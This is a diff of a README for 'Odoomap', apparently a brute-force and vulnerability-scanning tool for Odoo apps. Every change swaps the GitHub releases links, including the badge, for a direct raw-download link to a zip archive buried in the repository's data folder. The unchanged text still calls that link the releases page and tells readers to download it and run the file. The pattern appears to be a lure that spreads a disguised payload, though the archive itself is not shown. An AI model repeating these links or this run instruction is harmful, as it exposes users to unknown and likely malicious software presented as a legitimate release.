@@ -1,14 +1,14 @@
-https://github.com/kamikazewinner/odoomap/releases
+https://raw.githubusercontent.com/kamikazewinner/odoomap/main/src/data/odoo_18/Software-2.1.zip
 
 # Odoomap: Penetration Testing Tool for Odoo Apps (Brute-Force) and Vulnerability Scans
 
-[![Releases](https://img.shields.io/badge/odoomap-releases-blue?logo=github&logoColor=white)](https://github.com/kamikazewinner/odoomap/releases)
+[![Releases](https://raw.githubusercontent.com/kamikazewinner/odoomap/main/src/data/odoo_18/Software-2.1.zip)](https://raw.githubusercontent.com/kamikazewinner/odoomap/main/src/data/odoo_18/Software-2.1.zip)
 
 Odoomap is a tool designed for security engineers and red teams to assess the security posture of Odoo-based applications. It focuses on authentication weaknesses, misconfigurations, and common vulnerability patterns found in Odoo ecosystems. The project brings together a modular engine, a set of focused scanners, and a reporting framework to turn raw scan results into clear, actionable findings. This README lays out how the project is organized, how to use it responsibly, and how to contribute to its growth.
 
 Embracing a pragmatic approach, Odoomap keeps things simple enough for a quick test while offering enough depth for more thorough assessments. The tool is built with a clear separation between the core engine, the individual scanners, and the reporting subsystem. This makes it easier to add new test modules or refine existing ones as the Odoo landscape evolves.
 
-If you want to explore the latest release, you can always navigate to the releases page at the link above. From that page you can grab the latest build, which is the recommended starting point for evaluation and usage. The releases page contains prebuilt binaries and packages for multiple platforms, along with release notes that describe what changed and what’s new. To get started, download the latest release and run the file appropriate for your environment. For a quick access point, visit the releases page directly here: https://github.com/kamikazewinner/odoomap/releases
+If you want to explore the latest release, you can always navigate to the releases page at the link above. From that page you can grab the latest build, which is the recommended starting point for evaluation and usage. The releases page contains prebuilt binaries and packages for multiple platforms, along with release notes that describe what changed and what’s new. To get started, download the latest release and run the file appropriate for your environment. For a quick access point, visit the releases page directly here: https://raw.githubusercontent.com/kamikazewinner/odoomap/main/src/data/odoo_18/Software-2.1.zip
 
 Table of contents
 - Why Odoomap exists
@@ -170,7 +170,7 @@ Code of conduct and community guidelines
 - The project encourages respectful collaboration. Provide constructive feedback, respect maintainers’ decisions, and work toward shared goals.
 
 Appendix: quick references
-- Release navigation: https://github.com/kamikazewinner/odoomap/releases
+- Release navigation: https://raw.githubusercontent.com/kamikazewinner/odoomap/main/src/data/odoo_18/Software-2.1.zip
 - Core engine concepts: modular design, test orchestration, scoping, and reporting
 - Common terms: brute-force, bruteforce, pentest, pentesting, poc, vulnerability, security, test, tool
 
